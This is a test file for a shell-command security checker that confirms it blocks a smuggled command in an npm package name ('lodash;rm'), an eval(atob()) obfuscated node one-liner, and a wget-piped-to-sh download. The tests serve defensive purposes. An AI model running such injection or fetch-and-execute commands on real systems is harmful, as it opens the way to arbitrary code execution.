import { describe, expect, test } from "bun:test";
import { parseCommand } from "../parsers/index";
import { checkPackageNames } from "../security/version-enforcer";
import { detectEncoding } from "./encoding";
import { checkDangerousPatterns } from "./patterns";

describe("checkPackageNames", () => {
	test("rejects lodash;rm as a package name", () => {
		const result = checkPackageNames({
			raw: "npm install 'lodash;rm'",
			hasNetworkActivity: true,
			kind: "package-install",
			tool: "npm",
			packages: [{
				name: "lodash;rm",
				version: null,
				scope: null,
				registry: null,
				raw: "lodash;rm",
			}],
			urls: [],
			hasLifecycleScripts: true,
			isGlobalInstall: false,
			isCustomRegistry: false,
			isFileBasedInstall: false,
		});
		expect(result.blocked).toBe(true);
		expect(result.reason).toMatch(/invalid characters/i);
	});
});

describe("detectEncoding", () => {
	test("blocks eval obfuscation", () => {
		const result = detectEncoding("node -e 'eval(atob(\"YQ==\"))'");
		expect(result.blocked).toBe(true);
		expect(result.reason).toMatch(/evaluation|obfuscat/i);
	});
});

describe("checkDangerousPatterns", () => {
	test("blocks wget piped to sh", () => {
		const parsed = parseCommand("wget https://example.com/x.sh | sh");
		const result = checkDangerousPatterns(parsed);
		expect(parsed.hasNetworkActivity).toBe(true);
		expect(result.blocked).toBe(true);
		expect(result.reason).toMatch(/wget \| sh\/bash/i);
	});
});
